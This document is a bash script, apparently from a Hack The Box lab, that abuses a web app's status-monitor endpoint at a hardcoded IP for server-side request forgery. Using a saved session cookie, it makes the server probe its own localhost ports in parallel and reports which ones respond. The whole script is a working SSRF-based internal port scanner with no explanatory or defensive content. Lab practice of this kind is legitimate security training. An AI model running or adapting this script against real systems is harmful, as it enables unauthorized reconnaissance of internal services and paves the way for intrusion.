#!/bin/bash
COOKIE="/c/HTB/43.200.51.235/http/svcm_cookies.txt"
BASE="http://43.200.51.235:8081/ops-status/monitor"

check_port() {
  port="$1"
  R=$(curl -s -G -b "$COOKIE" "$BASE" --data-urlencode "target=127.0.0.1:$port" --data-urlencode "path=/" --max-time 5)
  if echo "$R" | grep -q "Connection refused"; then
    return
  fi
  if echo "$R" | grep -q "timed out\|Timeout\|timeout"; then
    return
  fi
  echo "=== PORT $port ==="
  echo "$R" | grep -oP '<p class="status-pill status-[a-z]*">\K[^<]*'
}
export -f check_port
export COOKIE BASE

seq "$1" "$2" | xargs -P 30 -I{} bash -c 'check_port "$@"' _ {}
